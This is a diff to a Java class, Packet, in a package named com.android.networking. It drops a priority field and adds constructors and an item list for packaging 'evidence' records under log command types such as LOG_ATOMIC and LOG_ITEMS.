@@ -9,7 +9,11 @@
 
 package com.android.networking;
 
+import java.util.ArrayList;
+
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
+import com.android.networking.util.Utils;
 
 /**
  * The Class Packet.
@@ -19,8 +23,8 @@ public class Packet {
 	/** The type. */
 	int type;
 
-	/** The priority. */
-	private int command, priority;
+	/** The command. */
+	private int command;
 
 	/** The id. */
 	private final long id;
@@ -31,6 +35,8 @@ public class Packet {
 	/** The data. */
 	private byte[] additional;
 
+	private ArrayList<byte[]> items;
+
 	/**
 	 * Instantiates a new packet.
 	 * 
@@ -39,9 +45,25 @@ public class Packet {
 	 */
 	public Packet(final long unique) {
 		type = EvidenceType.NONE;
-		command = 0;
+		command = LogR.LOG_CREATE;
 		id = unique;
 		data = null;
+	}
+
+	public Packet(int evidenceType, byte[] additional, byte[] data) {
+		type = evidenceType;
+		id = Utils.getRandom();
+		command = LogR.LOG_ATOMIC;
+		this.data = data;
+		this.additional = additional;
+	}
+
+	public Packet(int evidenceType, ArrayList<byte[]> items) {
+		type = evidenceType;
+		id = Utils.getRandom();
+		command = LogR.LOG_ITEMS;
+		this.items = items;
+	
 	}
 
 	/**
@@ -70,25 +92,6 @@ public class Packet {
 	 */
 	public int getCommand() {
 		return command;
-	}
-
-	/**
-	 * Sets the priority.
-	 * 
-	 * @param p
-	 *            the new priority
-	 */
-	public void setPriority(final int p) {
-		priority = p;
-	}
-
-	/**
-	 * Gets the priority.
-	 * 
-	 * @return the priority
-	 */
-	public int getPriority() {
-		return priority;
 	}
 
 	// Needed only when sending LOG_CREATE
@@ -147,5 +150,10 @@ public class Packet {
 	 */
 	public void setAdditional(final byte[] d) {
 		additional = d;
+	}
+
+	public ArrayList<byte[]> getItems() {
+		
+		return items;
 	}
 }
